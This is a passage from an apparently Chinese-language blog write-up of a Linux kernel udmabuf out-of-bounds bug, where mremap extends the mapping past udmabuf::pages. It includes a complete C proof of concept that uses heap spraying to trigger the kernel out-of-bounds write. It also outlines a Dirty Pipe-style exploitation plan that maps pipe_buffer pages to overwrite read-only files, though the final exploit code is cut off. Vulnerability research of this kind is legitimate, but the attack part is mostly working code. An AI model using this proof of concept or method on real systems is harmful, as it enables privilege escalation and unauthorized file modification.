或者 list */</span><br><span class="hljs-built_in">udmabuf_create</span>()<br></code></pre></td></tr></table></figure><p>在 <code>udmabuf_create()</code> 中会初始化 <code>dma_buf</code> 的函数表为 <code>udmabuf_ops</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf_ops</span> <span class="hljs-title">udmabuf_ops</span> =</span> &#123;<br>.map_dma_buf  = map_udmabuf,<br>.unmap_dma_buf  = unmap_udmabuf,<br>.release  = release_udmabuf,<br>.<span class="hljs-built_in">map</span>  = kmap_udmabuf,<br>.unmap  = kunmap_udmabuf,<br>.mmap  = mmap_udmabuf,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">udmabuf_create</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> udmabuf_create_list *head,</span><br><span class="hljs-params">   <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> udmabuf_create_item *<span class="hljs-built_in">list</span>)</span><br>&#123;<br>DEFINE_DMA_BUF_EXPORT_INFO(exp_info);<br><br><span class="hljs-comment">/* ... */</span><br><br>exp_info.ops  = &amp;udmabuf_ops;<br>exp_info.size = ubuf-&gt;pagecount &lt;&lt; PAGE_SHIFT;<br>exp_info.priv = ubuf;<br>exp_info.flags = O_RDWR;<br></code></pre></td></tr></table></figure><p>在 <code>mmap_udmabuf()</code> 当中为 mmap 对应的 <code>vm_area_struct</code> 配置了函数表 <code>udmabuf_vm_ops</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> <span class="hljs-title">udmabuf_vm_ops</span> =</span> &#123;<br>.fault = udmabuf_vm_fault,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mmap_udmabuf</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> dma_buf *buf, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> *<span class="hljs-title">ubuf</span> =</span> buf-&gt;priv;<br><br><span class="hljs-keyword">if</span> ((vma-&gt;vm_flags &amp; (VM_SHARED | VM_MAYSHARE)) == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>vma-&gt;vm_ops = &amp;udmabuf_vm_ops;<br>vma-&gt;vm_private_data = ubuf;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>因此在缺页异常时最终会调用到 <code>udmabuf_vm_fault()</code> 函数，从 <code>udmabuf::pages</code> 中取出对应的内存页：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">vm_fault_t</span> <span class="hljs-title function_">udmabuf_vm_fault</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> vm_fault *vmf)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span> =</span> vmf-&gt;vma;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> *<span class="hljs-title">ubuf</span> =</span> vma-&gt;vm_private_data;<br><br>vmf-&gt;page = ubuf-&gt;pages[vmf-&gt;pgoff];<br>get_page(vmf-&gt;page);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意到 <code>udmabuf_vm_fault()</code> 函数并未对 <code>vmf-&gt;pgoff</code> 的大小进行检查，这是因为  <code>dma-buf</code> 的 <code>mmap()</code> 路径会调用到 <code>dma_buf_mmap_internal()</code> ，在其中会先进行范围检查后再调用 <code>dmabuf-&gt;ops-&gt;mmap()</code> ，因此在 <em>正常读写</em> 的情况下并不会超出 <code>udmabuf::pages</code> 的范围：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dma_buf_mmap_internal</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dma_buf</span> *<span class="hljs-title">dmabuf</span>;</span><br><br><span class="hljs-keyword">if</span> (!is_dma_buf_file(file))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>dmabuf = file-&gt;private_data;<br><br><span class="hljs-comment">/* check if buffer supports mmap */</span><br><span class="hljs-keyword">if</span> (!dmabuf-&gt;ops-&gt;mmap)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-comment">/* check for overflowing the buffer&#x27;s size */</span><br><span class="hljs-keyword">if</span> (vma-&gt;vm_pgoff + vma_pages(vma) &gt;<br>    dmabuf-&gt;size &gt;&gt; PAGE_SHIFT)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">return</span> dmabuf-&gt;ops-&gt;mmap(dmabuf, vma);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">dma_buf_fops</span> =</span> &#123;<br><span class="hljs-comment">/* ... */</span><br>.mmap= dma_buf_mmap_internal,<br></code></pre></td></tr></table></figure><p>但这存在一个问题—— <code>mmap()</code> 所映射的区域是可以被扩展（expand）和收缩（shrink）的，这一般可以通过 <code>mremap()</code> 系统调用完成：</p><p><img src="https://s2.loli.net/2024/12/31/dctSPxWrJYBufqV.png"></p><p><code>mremap()</code> 可以改变一个 <code>vm_area_struct</code> 的地址空间大小，而这个功能默认开启，若要限制则需要在 mmap 时为 <code>vm_area_struct::vm_flags</code> 添加 <code>VM_DONTEXPAND</code> 标志位</p><blockquote><p>以 <code>kcov_mmap()</code> 为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">kcov_mmap</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filep, <span class="hljs-keyword">struct</span> vm_area_struct *vma)</span><br>&#123;<br><span class="hljs-comment">/* ... */</span><br>vma-&gt;vm_flags |= VM_DONTEXPAND;<br></code></pre></td></tr></table></figure></blockquote><p>而 <code>udmabuf</code> 的 <code>mmap()</code> 路径上 <strong>并未为 vm_area_struct 添加任何限制，这意味着可以直接用 mremap 改变内存块的大小</strong> ——这意味着 mmap 区域的缺页异常 <strong>可以超出 udmabuf::pages 的范围，将其相邻内存上的数据看作一个 page 指针进行映射</strong> ——即存在越界读写漏洞</p><p> <img src="https://s2.loli.net/2024/12/31/c3UShpumLf1qP5J.png"></p><h2 id="Proof-Of-Concept"><a href="#Proof-Of-Concept" class="headerlink" title="Proof-Of-Concept"></a>Proof-Of-Concept</h2><p>现在我们来进行漏洞验证，我们首先在 <code>udmabuf::pages</code> 旁边堆喷一大堆的垃圾数据，之后再使用 <code>mremap()</code> 扩展 <code>mmap()</code> 区域，随后读写 <code>mmap()</code> 区域以触发缺页异常来触发内核越界读写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/udmabuf.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> UDMA_PAGE_NR 128</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init_socket_array</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_socket[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create no.%d socket pair!\n&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spray_sk_buff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">proof_of_concept</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> dma_fd, dev_fd, mem_fd;<br>    <span class="hljs-type">char</span> *udma_buf, buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf_create</span> <span class="hljs-title">info</span>;</span><br>    <span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* prepare stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Preparing...&quot;</span>);<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">if</span> (init_socket_array(sk_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Unable to create socket for heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    mem_fd = memfd_create(<span class="hljs-string">&quot;test&quot;</span>, MFD_ALLOW_SEALING);<br>    <span class="hljs-keyword">if</span> (mem_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (ftruncate(mem_fd, <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to change size of mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (fcntl(mem_fd, F_ADD_SEALS, F_SEAL_SHRINK) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to seal mem_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/udmabuf&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to open udmabuf dev file&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">strcpy</span>(buf, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-comment">/* first heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying sk_buff...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (spray_sk_buff(sk_socket, buf, UDMA_PAGE_NR * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) - <span class="hljs-number">512</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to do the heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* allocate udmabuf::pages */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Allocating udmabuf...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    info.memfd = mem_fd;<br>    info.size = <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR;<br><br>    dma_fd = ioctl(dev_fd, UDMABUF_CREATE, &amp;info);<br>    <span class="hljs-keyword">if</span> (dma_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to create dma_buf&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* second heap spray */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying sk_buff...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (spray_sk_buff(sk_socket, buf, UDMA_PAGE_NR * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">void</span>*) - <span class="hljs-number">512</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to do the heap spray&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* mmap stage */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] MMAP and MREMAP udmabuf...&quot;</span>);<br><br>    udma_buf = mmap(<br>        <span class="hljs-literal">NULL</span>,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        PROT_READ | PROT_WRITE,<br>        MAP_FILE | MAP_SHARED,<br>        dma_fd,<br>        <span class="hljs-number">0</span><br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to map dma_fd&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    udma_buf = mremap(<br>        udma_buf,<br>        <span class="hljs-number">0x1000</span> * UDMA_PAGE_NR,<br>        <span class="hljs-number">0x1000</span> * (UDMA_PAGE_NR + <span class="hljs-number">1</span>),<br>        MREMAP_MAYMOVE<br>    );<br>    <span class="hljs-keyword">if</span> (udma_buf == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;Failed to mremap dma_buf area&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* trigger out-of-bound vulnerabilities */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Triggering...&quot;</span>);<br>    *(<span class="hljs-type">size_t</span>*) &amp;udma_buf[<span class="hljs-number">0x1000</span> * UDMA_PAGE_NR] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    proof_of_concept();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <span class="hljs-comment">/* never arrive here... */</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功让内核尝试将我们的垃圾数据作为 <code>struct page*</code> 指针进行映射：</p><p><img src="https://s2.loli.net/2025/01/01/2zapKWJb8lByN3G.png"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02. 漏洞利用"></a>0x02. 漏洞利用</h1><h2 id="越界映射-pipe-buffer-page-完成文件越权读写"><a href="#越界映射-pipe-buffer-page-完成文件越权读写" class="headerlink" title="越界映射 pipe_buffer::page 完成文件越权读写"></a>越界映射 <code>pipe_buffer::page</code> 完成文件越权读写</h2><p>有了将越界数据作为 <code>struct page</code> 指针进行使用的权能，接下来我们考虑如何进行漏洞利用，我们不难想到的是可以将开头原生有着合法 <code>struct page</code> 指针的结构体作为 <code>victim object</code> ，而其中不难想到的是 <code>struct pipe_buffer</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>而想到 <code>pipe_buffer</code> ，我们不难想到 <a href="https://arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/">CVE-2022-0847</a> ，即 <code>dirty pipe</code> 这一利用手法——<strong>通过 spice 系统调用将 pipe_buffer::page 映射为只读文件内容，从而完成越权写入操作</strong> ：</p><ul><li>首先堆喷 <code>pipe_buffer</code></li><li>接下来分配 <code>udmabuf::pages</code></li><li>再堆喷 <code>pipe_buffer</code> ，从而确保能够将  <code>udmabuf::pages</code> 用 <code>pipe_buffer</code> 包围</li><li>通过 splice 系统调用映射只读文件到  <code>pipe_buffer::page</code> </li><li>通过漏洞映射  <code>pipe_buffer::page</code> 页面并改写内容</li></ul><p>最终的 exp 如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span 